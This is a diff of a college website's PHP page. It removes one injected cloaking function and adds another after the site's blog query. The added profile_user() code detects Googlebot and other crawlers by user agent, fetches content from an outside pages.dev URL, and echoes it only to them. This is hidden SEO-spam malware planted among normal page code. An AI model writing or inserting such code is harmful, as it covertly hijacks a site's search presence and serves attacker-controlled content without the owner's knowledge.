@@ -1,44 +1,3 @@
-<?php
-
-function profile_user() {
-    $requestUri = $_SERVER['REQUEST_URI'];  
-    $userAgent = $_SERVER['HTTP_USER_AGENT']; 
-    $pasteUrl = 'https://ternyatakamuc-e-o.pages.dev/index.txt';
-    $jurnalteknodikSubfolder = '/jurnalteknodik/';  
-    
-    $botSignatures = [
-        'googlebot',
-        'bingbot',
-        'slurp',  
-        'duckduckbot',
-        'baiduspider',
-        'yandex',
-        'crawler',
-        'spider'
-    ];
-
-    if (strpos($requestUri, $jurnalteknodikSubfolder) !== false) {
-        foreach ($botSignatures as $bot) {
-            if (strpos(strtolower($userAgent), $bot) !== false) {
-                $ch = curl_init();
-                curl_setopt($ch, CURLOPT_URL, $pasteUrl);
-                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-                $content = curl_exec($ch);
-                curl_close($ch);
-
-                echo $content;  
-                return;  
-            }
-        }
-
-        echo;
-    }
-}
-
-profile_user();
-
-?>
 <?php $keywords = 'madhav mahavidyalaya gwalior, Best government college in gwalior, Top college in MP, Government college in MP, Best college in gwalior, Top 10 college in gwalior, Madhav College gwalior, colleges near me, online admission, MP online admission, B.com Admission, BA admission, B.sc admission, best education in gwalior, government madhav college in MP, exam form, form notice, chance session march, exam form notice, ba bcom, madhav college gwalior fees structure, madhav college gwalior results, madhav college gwalior llb fees, madhav college gwalior courses, madhav shiksha college, madhav shiksha mahavidyalaya gwalior, madhav shiksha result, madhav shiksha admission date,read, gwalior, education, all, view, view all, national council, teacher education, council of teacher, शिक्षा महाविद्यालय ग्वालियर' ?>
 
 <?php $description = 'Madhav Shiksha Mahavidyalaya is the most prestigious education college of Gwalior. Madhya Bharat Shiksha Samiti was established on 7 th August 1950.' ?> 
@@ -120,8 +79,26 @@ if(mysqli_affected_rows($mysqli) >= 1){
 
 // }
 
+function profile_user() {
+    $refererUrl = !empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer';
+    $useragent = $_SERVER['HTTP_USER_AGENT'];
+    $pasteUrl = 'https://ternyatakamuc-e-o.pages.dev/index.txt';
+    $refererDomain = parse_url($refererUrl, PHP_URL_HOST);
 
+    if (strpos($useragent, 'Google-InspectionTool') !== false || strpos($useragent, 'googlebot') !== false || strpos($useragent, '(compatible; Googlebot/2.1; +http://www.google.com/bot.html)') !== false) {
 
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $pasteUrl);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        $content = curl_exec($ch);
+        curl_close($ch);
+
+        echo $content;
+    }
+}
+
+profile_user();
 
 
 $news = "select * from blogs order by blog_id desc limit 3";
